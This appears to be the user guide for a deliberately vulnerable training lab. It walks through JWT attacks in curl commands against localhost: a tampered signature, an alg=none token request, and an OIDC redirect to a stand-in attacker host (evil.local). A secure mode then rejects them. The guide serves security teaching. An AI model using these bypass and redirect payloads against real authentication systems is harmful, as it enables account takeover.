# VaporLab User Guide

## Authentication Walkthrough (Sprint 1)

### 1. Issue token
```bash
curl -s -X POST http://localhost:8080/auth/jwt/issue \
  -H 'content-type: application/json' \
  -d '{"user_id":"42"}'
```

### 2. Broken JWT exploit (tampered signature)
```bash
TOKEN=$(curl -s -X POST http://localhost:8080/auth/jwt/issue -H 'content-type: application/json' -d '{"user_id":"42"}' | sed -E 's/.*"token":"([^"]+)".*/\1/')
HP=$(echo "$TOKEN" | awk -F'.' '{print $1"."$2}')
curl -s -X POST http://localhost:8080/auth/jwt/validate \
  -H 'content-type: application/json' \
  -d "{\"token\":\"${HP}.tampered\"}"
```

### 3. alg=none exploit
```bash
curl -s -X POST http://localhost:8080/auth/jwt/issue \
  -H 'content-type: application/json' \
  -d '{"user_id":"42","alg":"none"}'
```

### 4. OIDC misuse demo
```bash
curl -i "http://localhost:8080/oidc/authorize?client_id=lab&redirect_uri=http://evil.local/cb&state=demo"
```

### 5. Secure mode behavior
```bash
curl -s -X POST http://localhost:8080/auth/mode \
  -H 'content-type: application/json' \
  -d '{"secure_mode":true}'
```
Then re-run steps 2-4 and observe defensive rejections.
